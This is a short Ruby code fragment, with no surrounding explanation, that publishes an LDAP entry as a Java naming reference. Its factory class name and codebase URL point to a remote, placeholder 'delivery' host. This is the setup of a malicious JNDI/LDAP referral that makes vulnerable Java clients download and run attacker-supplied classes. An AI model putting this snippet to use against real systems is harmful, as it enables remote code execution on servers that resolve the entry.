attributes = {
  'objectClass' => ['javaNamingReference'],
  'javaFactory' => ['RenamedFactory'],
  'javaCodeBase' => ['http://delivery.example.invalid/renamed/']
}
connection.add(dn: distinguished_name, attributes: attributes)
